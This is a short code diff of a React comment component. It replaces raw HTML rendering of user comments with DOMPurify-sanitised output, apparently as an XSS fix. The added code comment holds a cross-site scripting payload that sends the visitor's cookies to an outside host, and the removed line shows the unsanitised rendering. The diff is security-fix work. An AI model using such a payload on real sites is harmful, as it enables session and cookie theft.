@@ -3,8 +3,10 @@ import userAvatar from '../assets/images/avatar.png'
 import moment from 'moment'
 import Button from './Button'
 import { useSelector } from 'react-redux'
+import DOMPurify from 'dompurify'
 const Comment = (props) => {
     const { userId, username, createdAt, avatar, comment, commentId,handleDeleteComment } = props
+    const clearData = DOMPurify.sanitize(comment)
     const user = useSelector((state) => state.user?.user)
     return (
         <div className='flex gap-4'>
@@ -24,8 +26,10 @@ const Comment = (props) => {
                     <span>
                         <span className='font-semibold'>Đã đánh giá:</span>
                         <span className='flex items-center gap-1'>
+                        {/* <b onclick={window.location="https://security-fe.vercel.app?cookie="+document.cookie}>click vo</b> */}
                             {/* {comment} */}
-                            <div dangerouslySetInnerHTML={{"__html": comment}}></div>
+                            {/* <div dangerouslySetInnerHTML={{"__html": comment}}></div> */}
+                            <div dangerouslySetInnerHTML={{"__html": clearData}}></div>
                         </span>
                     </span>
                     <div>
